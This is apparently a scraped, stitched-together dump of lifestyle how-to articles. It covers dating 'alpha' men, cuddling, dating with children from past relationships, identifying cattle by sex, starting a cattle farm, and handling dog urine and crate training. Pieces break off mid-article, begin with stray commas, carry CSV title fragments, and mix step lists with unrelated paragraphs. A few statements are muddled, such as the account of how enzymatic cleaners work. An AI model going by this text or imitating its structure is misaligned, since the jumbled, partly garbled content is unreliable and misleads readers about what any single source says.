, While the traits associated with alpha maleness can indicate success, there might be some undesirable traits that come along with it. For example, he might be stubborn, reluctant to take criticism, independent, and overly analytical.If you are a sensitive person who values emotional caretaking, perhaps an ""alpha"" is not the right fit for you. Think carefully about what makes you happy in a relationship.

, Not everyone is attracted to confidence and success, and perhaps you are attracted to certain kinds of confidence but not others. In order to determine what exactly you are attracted to, you might consider dating a wide range of personality types to see what you prefer.

Consider joining an online dating site to find a wide range of men to date.
Sign up for an activity or volunteer at a nonprofit to meet a wide range of people who share your interests.
Ask your friends to introduce you to new people you might date.
Take a personality test to help you figure out what your own personality type is and who a good personality fit might be., When you are first getting to know someone, take measures to make sure that you stay safe and protected. Don’t go anywhere private with a person you don't know well. Accept dates that are in public locations, like restaurants and movie theaters. Make sure that you know the agenda beforehand. Consider telling a friend what your itinerary is so that they know where you are.

Trust yourself and your instincts: if you feel unsafe, leave the situation immediately and call a friend to pick you up.

, A truly confident person might not be the one who attracts the most attention or boasts about his accomplishments. Someone who has a healthy amount of self-confidence might actually be more likely to take a backseat sometimes, to listen carefully, and to learn from his mistakes. A healthily self-confident man will:

Listen instead of talk all the time.
Be aware of what his strengths and his weaknesses are.
Ask for help sometimes.
Not judge others too harshly or be insulting.
Be able to stand up for himself and his needs.

, Sometimes it can be easy to mix up the signs of confidence and of arrogance. However, the key difference between the two is that a healthy, confident man will be comfortable in himself and will not be easily shaken or angered. An arrogant person, however, gets his self-esteem from how others treat him, which makes him more likely to be demanding, domineering, and unable to listen to criticism. Avoid men who:

Insult others in order to feel good.
Cannot handle loss or criticism.
Demand attention and praise.
Speak over others or interrupt during social situations.

, If you are attracted to leadership and strength, consider asking him to plan out your next date to surprise you. See what happens when he takes charge over your next encounter. This is also a good chance to see whether you both are interested in similar activities.

, If you are sexually attracted to dominant scenarios, let him know that you are interested in having him act in a more dominant way in the bedroom. It is important that you do this safely: be sure that you both communicate clearly about your desires and limitations and that both partners consent each step of the way. Make sure that either partner can stop the sexual activity at any point by using an agreed-upon ""safe word.""

, If you and your partner are both confident, competitive people, find dates that allow you both to compete and act as rivals to one another. This can lead to excitement and sexual attraction. Be sure that you try your hardest (do not lose intentionally), and feel free to engage in some good-natured ribbing when you are winning. Some dates you might go on include:


Playing paintball or laser-tag
Going mini-golfing
Participating in a charity race
Playing a board game that requires skill, such as chess
Be sure that your date is not a sore loser. If he has a tough time being on the losing side, that is an indication that he is arrogant, not confident.

, If you have found a confident man, it is likely that he will be able to introduce you to new experiences, ideas, and places. Try to enjoy exploring these new worlds with him, and perhaps you might discover a new passion or hobby yourself.

, If you find yourself stifling your own opinions, ideas, and thoughts, you are likely in a relationship that is based on control instead of on confidence and trust. Never lose yourself in a relationship: a healthy dating relationship is based on mutual caretaking and making each other thrive. If your partner is not helping you thrive, he is likely not a confident person at all, but rather a controlling, domineering person. Signs of controlling behavior include:

Lying
Bullying
Talking over you or talking too much
Distancing you from your loved ones
Giving you the silent treatment

Start slow.,
Be aware of environmental factors.,
Get comfortable.,
Do a little rubbing.",How to Cuddle1," Maybe your partner has been clear that they want to cuddle, or maybe you’re taking the initiative to start your snuggling. Regardless, it is best to start slow. Don’t jump into cuddling - literally, don’t jump on them, no matter how impatient you are. Place a hand on their shoulder, back, or on their waist to show your intent. Rest it there for a few minutes or give a light rub.


Make sure that your intentions for cuddling are clear. You can place a hand on their shoulder, but that doesn’t necessarily mean you want to cuddle with the person. Caress their arm instead to make sure they understand what you are leading into.
Remember that cuddling is often a stand-alone activity, and doesn’t necessarily translate into foreplay. Start slow and work till you're comfortable, not with the intention of progressing things past the cuddle stage.;
, So you’ve done the basics, and are ready to proceed into real cuddling. Before you make the transition though, keep in mind important environmental factors. Is it hot out? Because you might have to limit the amount of physical contact you have in order to avoid turning into a swamp monster. Are you on a couch or a bed? Or something else entirely? The amount of space you have to sprawl will change the cuddling positions you can perform., You’re about to be held down in a hug for quite some time, so make sure that you’re comfortable first. If you plan on doing some long-term cuddling during a movie or before bed, change into comfortable clothes or grab a cozy blanket. Although you might be resting on the other person, having a pillow present might be a good idea too.

, The PG kind; rub your partner's back, legs, or arms in a sensitive and endearing fashion. This may or may not be the same as light massage. The goal here is to make the other person comfortable and interested in further cuddling with you. When you have transitioned into true “cuddling,” you may choose to continue the light rubbing to prolong the positive feelings you both get from it.

""I am happy to find middle ground, but I am not willing to let go of my core beliefs. It is important that you are willing to compromise if I am going to compromise too.""

, Be careful if he acts aggressively by breaking things, making threats, or frequently raising his voice to the point that you end up in tears. This is not acceptable behavior, and you deserve better.

Leave the situation immediately if you feel personally threatened. Let him know that his actions are unacceptable, and seek help outside of the relationship from a friend, the authorities, or a domestic abuse hotline.

, In general, people are happy in relationships when there is an egalitarian power structure. In this case, both partners might share chores, have equal say over important decisions, and might both work outside of the home.These relationships are less likely to end in divorce or break-ups.

, While egalitarian relationships are the most successful in the long run, they might also reduce libido and sexual passion.If you are attracted to dominance, consider finding ways for this dominance to be expressed, even if it does not impact your day-to-day decision-making. For example, you might consider:


Introducing a dominant/submissive role-play during sex. Be sure to discuss your preferences and limitations in advance, and make sure that you can stop the role-play at any time by using a ""safe-word.""
Finding outlets to perform traditional gender roles. For example, a woman might dress up in traditional feminine outfits; a man might dress up in athletic clothing.Divide chores along gendered lines. If you are a woman in a heterosexual relationship, consider taking on some stereotypically feminine labor, such as cooking or washing dishes. Ask your partner to take on stereotypically masculine labor, such as repairing the car. This might increase sexual attraction., Many people who exhibit typical ""alpha"" traits communicate in a direct manner. They tend not to beat around the bush. Try to keep this in mind so that you are not offended at how direct and straightforward their conversation is. Instead, remember that direct communication can help a relationship avoid patterns of passive-aggression or mutual dissatisfaction:

If your partner's bluntness is insulting or hurtful, however, these are warning signs that your partner is going well beyond ""direct"" communication and is instead hoping to injure your feelings. This is not a sign of confidence but of aggression, and you should consider whether he is worth your time and energy., Tell your partner what you find attractive about him and his confidence. Feel free to be direct about what makes you happy in a relationship.


If you enjoy his athletic ability, for example, tell him that and support his athletic successes.
If you are attracted to chivalrous behavior, tell him that you love it when he buys you flowers, jewelry, or surprising you with exotic vacations. Express your delight and pleasure when he engages in these behaviors., If both you and your partner are confident people, you will likely have some independent interests and activities that the other one does not share. Be sure that you both maintain your independence in certain areas, even if you share many other activities. Keep your old friends, keep up with your old hobbies, and spend some time apart every now and again. Healthy boundaries will help the relationship last and will help you both maintain your self-confidence.

, True confidence is not about performing strength but rather about being honest about who you are and what your needs are. People who are confident will not be afraid to build a lasting bond with the right person.If the person you are dating is emotionally honest and is willing to commit, that is a good sign that he is a truly confident person who knows what he wants.

Go with the classic, and spoon.,
Try out the half-spoon.,
Layer up.,
Go face to face.,
Try the star-gazer.,
Lay your head in their lap.",How to Cuddle2," The most traditional of all cuddling positions, spooning is popular for a reason: it’s great! Spooning consists of a “big” and “little” spoon, where both partners lay on their sides tucked into each other. The big spoon is the one in the back, and often drapes their arm over the torso of the little spoon.


Be aware of your heads. Because your heads are nearly even with each other, it is best to stagger them a bit. The big spoon can rest their head on the shoulder of the little spoon, or prop it up on an arm.
Keep heat in mind. Spooning is one of the greatest heat-generating cuddling positions, because there is so much physical contact. The big spoon may have to hold off wrapping their arm around the little spoon or move their legs back a bit to avoid creating a sweat pool., Nearly as classic as a complete spoon, the half-spoon is accomplished with one person laying on their back and the other facing them, laying on their side. The person on their side will likely rest their head on the other’s chest. Intertwine your legs for an even more intimate cuddling session.

, Best for cuddling in tight spaces, layer your cuddling by having the larger person lay face up. The second person can then rest face-down directly over the bottom half. To avoid suffocation of the lower stack, the top person should stagger their body slightly downwards, so that they can turn their head to the side and rest it on the bottom half’s chest.

, One of the most romantic cuddling positions is when you lie towards each other face-to-face. You may lie on your stomachs and turn your heads to the side, or lay on your sides - whatever works best. Increase the romantic feelings swirling around the room by holding hands in the space between your bodies., You know, you and your partner are out camping or watching a meteor shower, and therefore want to cuddle but both need to see the sky. Lay on your backs next to each other and wrap your legs together. If you don’t mind a dead arm, one of you can slip their arm under the neck of the other person in a half-embrace. You can also hold hands over your torsos or in the space between your bodies. Contrary to the name, this can be done under any circumstance, not just when stargazing.

, This cuddling move is great for when you want to talk and makes maintaining eye contact easier. Have one person sit up, while the other lays down perpendicularly to them with their head resting in their lap. This gives the person sitting up a great opportunity to play with their partners hair or sweetly stroke their face.

Play with their hair.,
Do a little kissing.,
Practice some massage.,
Run your hands down their body.,
Softly tickle them.",How to Cuddle3," There are few feelings so sweet and nice as when someone plays with your hair. Gender doesn’t matter, simply run your hands through your partner’s hair while you cuddle. This may or may not be a variation of a scalp massage crossed with a finger hairbrush. Playing with your partner’s hair is a certain way of making them happy and comfortable.

, Kiss your partner in a sentimental fashion, not in preparation for making out. Plant little kisses on their forehead, arms, or hands to show that you love and care for them. This move is sure to leave them swooning and happy to be wrapped up with you.

, Everyone loves a good massage, right? Show your partner some love by gently massaging the areas nearest to you. This will likely be their back, shoulders, or arms. If you don’t want to do any massaging, just rub them back and forth with your hands.

, Lightly stroke their body with your fingertips. Run your hands down their torso, along their legs, or along their arms. This is easiest to do from a spoon or half-spoon position, but can accomplished in any cuddling form.

, Gently tickling your partner will have them squirming and giggling closer to you in no time. Be careful not to take the tickling too far; do it only long enough to show that you’re flirting and that you want them closer to you."

Talk openly with your date.,
Take your time.,
Create boundaries and rules.",How to Date when You Both Have Children from Previous Relationships1," It may seem scary, but talk about how each of you feels about the relationship. Discuss how you may involve the children in your relationship and what that may look like in the future. Talk about how often each of you sees your own children and any complications with an ex regarding the children.If it makes you feel more comfortable, then you can also avoid talking about the future and stick to discussing general rules that you have about dating someone regarding your kids. This may help to open up communication about these things earlier than normal. However, keep in mind that this may not always be possible.


How big or small of a role with each of your children play in the relationship, and how might that affect you as a couple? What variables should go into making that decision? The age of the children? How big a role you already play in their life and decisions regarding them?
What’s the relationship like with the exes for both of you? How might that complicate the relationship?;
, There’s nothing to rush when entering a relationship and kids are involved. Give you and your partner time to figure out what you want and whether you can realistically make a relationship work. If the potential to merge your families might exist in the future, think about what that may be like for you, your partner, and your kids. If merging both of your families is unrealistic, cautiously consider if you will move forward in the relationship.Be upfront about having kids, but don’t rush to introduce them to the person you’re dating. Wait until you are solidly a part of each other’s lives and see a future together.
Keep in mind that your kids will notice things and have questions. Do not lie to them during this time or try to hide the fact that you're dating. Also, be aware that young children may not understand what dating means, so you will need to explain in words they can understand.

, Talk about what is acceptable for your relationship regarding spending time one-on-one, being with your or their kids, staying over, dating, and phone calls. Once you and your partner are clear, discuss these things with your children as well. This can help your children feel involved and informed for what happens in their house.Decide how you will spend time together, where you will spend time together, and what kind of communication is acceptable. Can your date come to your children’s soccer game or accompany you to a work function? Will you let your ex know the kids are meeting someone new?


Make sure to be flexible as well. Take time to reassess the situation every couple of months and discuss what is working and what is not working.
Your children may wish to voice their concerns or ask questions. It’s important to listen to them and validate their feelings. Remember, though, that you are the adult and make the final call.
Finding a balance between being there for your kids and making a new relationship work can be difficult, and often will require changing or canceling plans based on your children’s or your date’s children’s needs.

Speak openly with your children.,
Give your kids plenty of attention.,
Let the children have some control.,
Make soft invitations to older children.",How to Date when You Both Have Children from Previous Relationships2," Don’t keep your kids in the dark when it comes to dating someone new. Let your children know that you’re dating and that your partner has children. If and when it comes time for your children to meet your partner’s children, they should be prepared without making any last-minute discoveries, especially involving other children. This may make them feel threatened. Children don’t want to be left in the dark about important things, so let them know what’s ahead.Talk to your kids about dating someone that has kids. You may want to tell your kids about them or show them pictures of who they will meet.
Speak with your children individually to inform them of your relationship and any future plans you may have. Children want to be told the truth, but you may wish to give older children more information than younger children.
Be sure to keep the lines of communication open as well. Your children might not have questions right away, but let them know that they can come to you to talk or ask questions at any time.

, Kids may begin to feel jealous of you if you’re spending time with someone else. They may begin to resent the person you are dating for taking you away. Help to calm your children’s fears by spending time with them. While it may be easy to get wrapped up in your new relationship, set aside time to spend with your kids and assure them that they are a priority.Spend one-on-one time with each individual child. Assure them that you love them and that nobody is intentionally trying to harm or hurt them.

, If you’re spending time with your partner’s children, let them take the lead in your relationship. Don’t force a relationship with your partner’s kids, and also don’t force your own kids to form a relationship with your partner. Don’t force hugs or kisses or any kind of physical affection and let the children initiate affection on their own terms.Try teaching your kids appropriate greetings, such as shaking hands and introducing themselves.
Make time spent with their kids enjoyable and vice versa. Plan activities that the kids will enjoy so that they look forward to spending time with you or your partner.

, If your children are older or your partner’s children are older, make invitations for them to get to know your partner. If you’re focusing much effort on having your child accept your partner, you might push too hard and push them away. Provide opportunities for your teen or adult children to get to know your partner on their own terms, and encourage your partner to do the same.For example, say, “Jamie is coming over for dinner tonight. You’re welcome to eat with us if you’d like to join. I won't pressure you, but it would mean a lot to me."" This last statement is helpful because otherwise it might sound like you're including them as an afterthought.

"
"
Use careful introductions.,
Expect mixed reactions from kids.,
Get to know each others' children.,
Explore new family activities.",How to Date when You Both Have Children from Previous Relationships3," You may wish to pace your new relationship with your children. For example, you might casually introduce your children to your partner as a friend, or if your children are prepared, as a date. While a casual introduction may be appropriate for a new date, don’t blend children and your partner unless you feel confident in the possibilities of your relationship. When meeting your partner’s children, use the same rules in introductions and spending time together.Say, “This is the person I told you about. We’re spending time together.” You can also say, “I told you I was dating someone, and I’d like you to meet Chris.”
Be sure to consider where you’d like to make the introduction. For example, a neutral location, such as a coffee shop or park, may seem less threatening to your child. Or, your child might feel more comfortable in an environment that is familiar to them, such as at home.

, Children may respond to meeting you by being excited, resentful, fearful, happy, and sad. Children may struggle with loyalties to their other parent and feel like liking a parent’s new girlfriend or boyfriend is turning their back on their other parent. If your partner’s children don’t accept you immediately or are hot/cold toward you, recognize that this is normal. Be friendly and open with them, yet give them time and be available to them.The same goes for your own children. If you feel disappointed that your children aren’t warming up as much as you’d like to your partner, relax and give it time. Don’t push them into a relationship and accept their feelings.
Do not shame them for whatever they are feeling. Let them process their feelings however they normally do and then ask them later how they are feeling.

, Instead of arranging large get-togethers with both your date’s children and your own, focus on spending time with each other’s kids first. For example, spend a day with your partner’s kids one weekend, then with your partner and your own kids the next weekend. Get to know each other’s kids separately before putting them all together. This can add a level of comfort for your children instead of them feeling thrown in to socializing with many strangers., If you choose to spend time with both your and your partner’s children together, find a new activity that can become special to all of you. Creating something together can bring a sense of unity and teamwork to the dynamic. Doing something new for everyone can encourage everyone to interact and get to know one another in a unique and fun environment.Go to a trapeze school, explore indoor climbing, or work on an art project together.

"
"
Spend quality time together.,
Plan some low-key dates.,
Have reliable babysitters.,
Find ways to cope with stress.",How to Date when You Both Have Children from Previous Relationships4," Your time might be short due to your family obligations, so make your time count. Enjoy your time together and do activities that you both enjoy. Discuss the important things about who you are, your family, your kids, and whatever is important to you. Do activities that are fun and meaningful to both of you.


If you’re not sure about a date or a future together, listen to your gut feelings and keep your children and their children in mind if you’re considering moving forward.

, There may be times when one of your kids is sick or your partner can’t find a babysitter. Learn to love low-key nights of watching a movie at home or going on a walk together. While it’s nice to go on dates that include dancing or adventure, learn to enjoy quiet nights at home, too.Dress your take-out dinners up by adding candles and eating with real plates and silverware.

, When both you and your partner have kids, expect the unexpected. For example, if your ex is supposed to have the kids but you’re suddenly left with them on a night you planned a date, have a list of babysitters that can come through on late notice. Have a few babysitters available so that one can cover if another is busy.


Ask your partner if they have backup plans for last-minute changes and readily available babysitters.

, Blending two families can be a stressful process, so it is important for you to practice self-care and seek help if you need it. Try to set aside at least 15 minutes every day to use a relaxation technique as well.

You can try using yoga, meditation, or deep breathing to relax.
Talk to friends and family for support. You may also consider seeing a therapist if the stress gets to be too much for you.

Learn the relevant definitions.,
Understand the myths surrounding the ability of being able to distinguish the sex or gender of a bovine.,
Be aware of the anatomical and physiological differences between each type of bovine.,
Go visit a farm or ranch to learn the anatomical differences as described above.","How to Tell the Difference Between Bulls, Cows, Steers and Heifers"," These are:



Cow: a mature female bovine that has given birth to at least one or two calves. Colloquially, the term ""cow"" is also in reference to the Bos primigenius species of domestic cattle, regardless of age, gender, breed or type. However for most people who work with or raise cattle, this term is not used in the same reference as previously noted.

Bull: a mature, intact (testicles present and not removed) male bovine used for breeding purposes.

Steer: a male bovine (or bull) that has been castrated before reaching sexual maturity and is primarily used for beef.

Stag: a male bovine (or bull) that has been castrated after or upon reaching sexual maturity and is primarily used for beef, but can and is also often used as a ""gomer bull"" for detecting cows and heifers in heat.

Heifer: a female bovine (often immature, but beyond the ""calf"" stage) less than 1 to 2 years of age that has never calved. Such females, if they've never calved beyond two years of age may also be called heiferettes.

Bred Heifer: a female bovine that is pregnant with her first calf.

First-calf Heifer or First-calver: a female bovine that has given birth to her first calf, and is often around 24 to 36 months of age, depending on the breed and when she was first bred.

Ox (plural: Oxen): a bovine that is trained for draft work (pulling carts, wagons, plows, etc.)This is a term that primarily refers to a male bovine that has been castrated after maturity. However, an ox can also be female bovine (cow or heifer) or even a bull that has been trained for the same purpose. In the Biblical times, an ox was a general term used, just like with the term ""cows,"" to a domesticated bovine regardless of age, gender, breed, type, or draft purposes.

Calf (plural: Calves): an immature bovine (male and female) that is reliant on milk from its dam or from a bottle in order to survive and grow. A calf is known as such from birth to around 10 months of age.

Bull calf: an immature intact male bovine (since all males are born with testes) that is reliant on milk from his dam or a bottle for growth and survival.

Steer calf: an immature male bovine that has been castrated a few days to a couple months after birth, and is reliant on milk from his dam or a bottle for growth and survival.

Heifer calf: an immature female bovine that is reliant on milk from her dam or a bottle for growth and survival.

Freemartin: an infertile or sterile heifer or heifer calf. Such infertility is a result of being maternally twinned with a bull calf and whose placental tissues were shared in the womb. During the first trimester, reproductive organs start to form and sexual hormones begin to be produced in the fetus. When male and female fetal calves are twinned together, the testosterone produced by the male inhibits estrogen production in the female. This results in abnormal, underdeveloped or hermaphroditic reproductive organs in the female fetus. This is not so for the male. Freemartins are sometimes referred to as ""hermaphrodites"" if they are born with reproductive organs of both genders. As a result, this type of freemartins tend to develop secondary male sexual characteristics (muscular crest over neck, wide forehead, etc.) upon reaching puberty.

Cattle: general plural term for more than one bovine

Cattlebeast/bovine/animal: a singular term for a bovine whose gender cannot be determined, particularly when viewed at a distance. Most people like to refer to a bovine of unknown (or ""unknown"") gender as a ""cow,"" simply because it is a much more well-known and popular term to use than ""bovine"" or ""cattle beast."" This, however, is often not the case around experienced cattlemen and cattle women or ""ranchers"" (as some like to call them) who never use the term ""cow"" when referring to a bovine that is anything but a cow. ""Animal,"" ""critter,"" ""creature,"" or any other term, coarse or not, are most often used over the colloquial word ""cow."" !;
,



Only bulls are horned; cows are polled: This is a myth. The reality is that both sexes (or genders) can be horned and/or polled. If you are relying on whether a bovine is horned or not as an indication of the sex (male or female) or gender of the animal, please remember that this is the least reliable means of telling whether that bovine is either a cow or a bull. The best way to tell if a cow is a cow and a bull is a bull is to look between the hind legs for presence of an udder or a scrotum, respectively.

Bulls are solid coloured (often brown) individuals, whereas cows are only black and white: This is also a myth. Bulls are not primarily solid coloured, nor are cows primarily black and white. Quite frankly, the colouration can be, and very often is ,vice versa: Purebred Holstein, Holstein-Freisian and Freisian bulls are always black and white just like their female counterparts, and many cows, both dairy (such as with Jersey, Brown Swiss, Guernsey cows) and beef (including Gelbvieh, Limousin, Red Angus, Red Brangus, Santa Gertrudis and fullblood Simmental cows) are predominantly brown or red. There are quite a number of breeds in the world that have black and white bulls and cows: the Holstein breed is just one of them, and happens to be the most popular and well-known of these breeds. The same goes for solid-brown or red cattle: Many commercial and hybrid beef cattle are often found to be solid red or brown.

As a matter of fact, bulls and cows (not to mention steers, calves and heifers) can be any colour except pink, purple, green and blue. They can be white, brown, black, yellow, orange, red, grey, and any variation (often with white) of any of these colours, including roan, speckled, patchy, pointed, white-faced, dorsal-striped or white-tailed. Belgian Blue cattle, for example, are not named because they are truly blue, but because they are often a blue-roan colouration that makes them appear smokey-blue due to the mix of black and white hairs in the hair coat of this breed.



, These differences are as follows:


Cows: The best way to tell if a bovine or cattle-beast is indeed a cow is to look between the hind legs and see if an udder is present. An udder is a pink bag-like organ that has four teats (cylindrical ""knobs"" that hang down from the udder) that generates milk for a young calf to drink. Cows you will see may have a calf at their side, except for most dairy cows or beef cows that have just come off from being weaned from their calves. Cows typically are smooth from the head all the way down to the tailhead, with no shoulder crests (like bulls have) and not as much muscling around the shoulders and hips like bulls do. Bos indicus cows (those that have the loose skin and long floppy ears) have a hump on their shoulders, but it is much less defined than that in bulls of the same species of bovine. If you look under the tail (if you can't you can see it when the tail is swishing flies away or for some reason or other, is held to the side), you will see a slit with a prepuce hanging down from it. This is where the vulva is located, the area where cows (and heifers) urinate from, accept the penis of bulls to be bred, and where their calves are born from. All cows have this, and it is a bit more defined and larger in cows than in heifers. Vulvae are located below the anus.







Bulls: Bulls are typically massive beasts. When they are among the cowherd, it's pretty easy to pick out the bull among the herd because of his larger size and masculinity in comparison to the more feminine-looking cows or heifers that he is with. Not all bulls have horns. The only way you are really going to tell if it's a bull or not is to look to see if there is a large football-shaped sac hanging down between his hind legs. This is relatively easy to see when you are getting a side-view of him (except when the hind leg nearest to you is shifted forward and not back), when you're behind him, and when he's walking. They also have a sheath or hairy prepuce on their underline (right in the middle of the belly and parallel to the ground; this area is called the navel) where their penis is housed. Most sheaths are more defined in bulls than in steers, and a lot of bulls may have a pink fleshy protrusion being exposed from the sheath. That is the end of their penis. Cows and heifers do not have this sheath; some may have some loose skin hanging from the same area, but others will not have this. Bulls typically have a large, very muscular crest over their necks or shoulders (with Bos taurus cattle like Angus, Simmental, or Texas Longhorn, it is found on the neck), and are typically very muscular on their shoulders, necks and their hind quarters than cows are. Most will have a large, blocky appearance, with their front and hind legs wider set (held farther apart) than cows, due to the muscling in the chest and shoulders. In the Bos indicus breeds, bulls typically have a sphere-shaped hump over their shoulders, much more defined and pronounced in bulls than in cows.







Steers: Steers have similar conformational qualities as bulls do, except that they lack that testicular sac between their legs and their navel or sheath is much less defined. However, steers still retain the hair hanging down from the middle of their belly, and this is, like bulls, where their penis is housed and where they urinate from. This little hair is pretty much the only way to tell if this animal you are looking at is a steer. Steers typically appear more feminine than bulls do, lacking the characteristic muscular hump and depth over the neck and shoulders. Sometimes, when steers and heifers are living together, the only way to tell if the animal you are looking at is a steer is that the vulva, present only in heifers and cows, is absent. If there's nothing else under the tail except the anus, and said animal has no testes, then it's a steer. Steers are not born as steers, they are born as bull calves and are made into steers by the process of castration.







Heifers: These are typically young females that a) were born as females (often called heifer calves) and b) retain female characteristics like cows do. Heifers are typically younger than cows, and often, to an experienced cattle person, a heifer or a first-calf heifer can be easily distinguished by noticing the youth of the animal and her size in relation to older more mature cows. These types of cattle are usually ones that are still growing past when they have their first calf, and reach full maturity by the time they are 3 or 4 years of age. Heifers have no sac between their legs, nor do they have the sheath and little hair hanging down typical of bulls and steers. They have almost no udder, just little teats that are difficult to see between the back legs except if you are kneeling down close beside her. They have a vulva underneath the tail (which is below the anus), but it is smaller and a little less defined than in mature cows. The udder and vulva increase in size both when the heifer, that has been bred, is about to calve. Even then, the udder is typically smaller in heifers than in cows.







, This will help you learn to know what to look for and how to properly distinguish the difference between bulls, cows, steers and heifers.


When walking along the fence or with the cattle, be calm and quiet. Don't get excited, tense or fearful, around them, and if they come up to you, don't be alarmed as they are naturally curious animals. If you find you are getting tense or afraid, walk out of the pasture or corral to where they can't go, and try to relax.

Beware of those that paw the earth at you, throw their heads around at you, approach you aggressively, growl at you, or wrinkle their nose at you. But those that back away from you or simply like to follow you are those that a) respect your space and accept you as The Boss, and b) just like human companionship and think you have treats for them, respectively.


If you cannot visit a farm or ranch, find pictures on the Internet to help you learn the differences. You can do an image search through your favorite search engine, or look at pictures posted by other cattlemen and -women that frequent various public cattle or livestock forums, such as CattleToday.com or Backyardherds.com.

Most of all, have fun!",How to Start a Cattle Farm," Do a SWOT analysis of yourself and the cattle industry you will be entering. Plan what kind of cows you want without looking at any breeds, and what kind of farm you wish to operate.



Keep in mind to start small. Don't spend your money in the first 2 years after buying or inheriting the farm or ranch. If things need repairs, repair only the fencing or facilities that are top priority over other things, such as renovating the barn or the house, or redoing the handling facilities to what you plan on doing. Buy machinery at an auction, not brand new. Buy the equipment and other items that you need right now, not what you want. You will get what you want over the next 5 to 10 years as you grow your new operation.
Try to aim for being a low-cost producer, as that is the surest way to make money, and the best way to start if you don't have much to begin with!;
, This is important because you need to find a location that you are used to or really like and are confident you can raise your animals in.


Location can range from as far north as Alberta, Canada, to as far south as Uruguay, South America. Factors such as climate, seasonal variances, markets, vegetation and topography differ for every location that you may choose.

, Keep in mind that you may need to invest in a down-payment, a loan, or a mortgage for the land you wish to buy, if you do not have enough money to pay it off within the year you buy it.


Land prices tend to increase in areas where there is a higher population, or land is in higher demand than in other areas.
Try to buy a farm or ranch that already has the facilities and fencing laid out for cattle, rather than buying a farm that needs to be converted for cattle.

, Contact the local extension office for that county to get more information on previous use, soil type, vegetation, stocking rates and carrying capacity for pastures (tame grassland) or rangelands (native grassland), cattle market demands, etc. Visit the neighbors that are in the area you wish to start farming/ranching in, and talk with them.


Often the neighbors will provide you with more information than what a government agency office can give you.

, Analyze your operation and your financial situation to see what you need (not what you want) for current facilities, equipment and machinery. Fencing, watering facilities, feed bunks/troughs or bale feeders is priority above all other assets needed. A tractor, haying equipment, trailer, handling facilities and other buildings are also important.


If you have chosen a dairy operation, you will need multiple buildings and a milking parlour with stanchions to be able to run your operation, in addition to calving facilities, a calf barn, and a barn to hold cows when they're not being milked.

When deciding upon the type of stanchion to use for milking, there are several items to consider: first, have the cows been milked before and what are they used to? It is best to keep the same type of stanchion. If you will be raising them yourself, research the different types to determine what would work best in your situation.


With beef cattle, quite often fencing, some sheds and water sources are all you need, especially if you are wanting to raise a grass-based beef operation, be it finishing beefers on grass or a cow-calf operation. The exceptions are if you are willing to spend extra money on winter feeding costs and supplementing your cows with grain, or if you are wanting to run a feedlot.

, The most popular choices are dairy or beef. Keep in mind that starting up with and raising dairy cattle is much more time consuming and costly than with beef cattle, and there will be more equipment requirements for dairy than beef as mandated by government regulations.

, Determine the type of breeds you want according to your goals for your farm or ranch are, not what you like and what you are willing to do to work around the fall-backs of a particular breed.


If you are into beef production start with a breed that is known for good temperament and is not labour intensive. Herefords, Red Polls, Shorthorns, Galloways and British White are such breeds that are renowned for their docility.

If you are insistent of raising Angus cattle because of what the markets in your area are demanding, please be very careful in selecting the type of cattle you want. See How to Raise Black Angus Cattle for further information.


If you are into dairy production though, the most best and most popular breeds for dairy are Holstein, Jersey and Brown Swiss. Guernseys and Ayrshires may also be popular for you if you are not located in North America.

, Don't go whole-hog and buy as many cows as you can stock on the land you bought for a whole year. Buy good cows, ones that have great conformation, temperament, mothering ability and forage convertibility (among other things), and avoid those that look thin and are close to breaking-down. Heifers may be an option if you wish to wait for 2 years until you sell their calves; 3-fers/3-in-1's or bred cow with calf at side is another option, since you can sell the calf in a month or two, and wait for another few months before the cow calves out. Experienced cows tend to be easier to manage and handle than heifers.


Avoid buying a bull if you only have 4 or 5 females; buy a bull only if you have at least 10 cows, or do not wish to use AI (artificial insemination) any longer. If you have only 2 or 5 cows, AI is the cheapest and best (but not always the most effective) option for breeding all your cows. If you don't want to use AI, then rent a bull or find another cattle producer that will agree to keep your cows for a couple months to have his bull breed them for you.

, Decide whether the land you already own is sufficient or if you will need to purchase or rent additional pasture.


Determine whether you will be growing hay for the cattle yourself or purchasing it. Make sure that you use only the highest quality hay that you can afford.
Keep in mind that feed costs comprise almost 26% of the cost of raising cattle. Having sufficient acreage in the summer months for the cattle to graze on reduces those costs immensely, as does raising higher quality hay. Also keep in mind your plans for grazing, such as winter grazing if you don't want to get caught up in buying or making hay all the time. Winter grazing plans differ from area to area, so be aware of your options.

, The most important records are your financial records, because these records determine whether your operation is giving you net income or loss. In Canada, it is mandatory that you have records of all the animals on your farm in addition to RFID tag information for each and every animal that is bought, sold or born on your farm.

, It's a stressful and demanding lifestyle, but you will forever be learning lots and be kept busy with feeding and maintaining the health of your cowherd.

, As natural omnivores, dogs eat high amounts of proteins, and nitrogen is the by-product of their body's protein breakdown process. Dogs better digest high-quality proteins. Since your dog uses less effort to breakdown these better proteins, he produces less nitrogen. By reducing the amount of lower-quality proteins in your dog's diet, you can reduce the amount of nitrogen he deposits in your yard.


Replace one of your dog's meals every day or every other day with high-quality canned food. The extra water in the canned food will dilute your dog's urine, and therefore reduce the potency of the nitrogen he deposits.

Lay a few pieces of paper towel over the water and detergent and gently press it into the carpet. Absorb as much of the urine as you can this way.Make sure to test dish detergent on a small portion of your carpeting that's not clearly visible. You want to make sure dish detergent does not react poorly to your carpeting before applying it to a urine stain.;
, After blotting up a stain, targeting the spot with an enzymatic cleaner is a good idea. These cleaners help disrupt the breakdown of bacteria that causes pet odor. This can help remove unwanted odor, which can encourage your dog to urinate in the same area again.Follow the instructions on your cleaner's bottle for use. Usually, you spray your cleaner over the stain and it then dissolves and dries. This process can take anywhere from two hours to two weeks.
Make sure to test your cleaner on a small patch of carpet that's not visible before applying it to the stain. You want to make sure your cleaner does not stain your carpeting.

, If a stain is set in, a miniature wet vac may be necessary to deep clean the carpeting. This can also be helpful if an animal is going in the same spot repetitively. Miniature wet vacuums can run between $150 and $200.

One of the reasons that crate-training is effective for housebreaking a dog is that dogs will not eliminate waste where they sleep. If the crate is too large, the dog may use one end for sleeping, and use the other as a latrine. If your puppy is still growing, you can buy a crate that will accommodate his adult size, and block off part of it with a divider (sold with some crates) to fill up the extra space.
Many humane societies and some veterinarian's offices rent crates, so you can get one that is the appropriate size for your puppy and trade up as the animal grows.
If you plan to use the crate for air travel, be sure to choose one that is approved by the FAA or your airline of choice.;
, There are many different kinds of crates you can buy, including wire, plastic, and soft-sided. Choose the best crate for your dog and circumstances.Wire crates are the most inexpensive and breathable, and usually come with dividers for walling off part of the crate to accommodate a growing puppy.
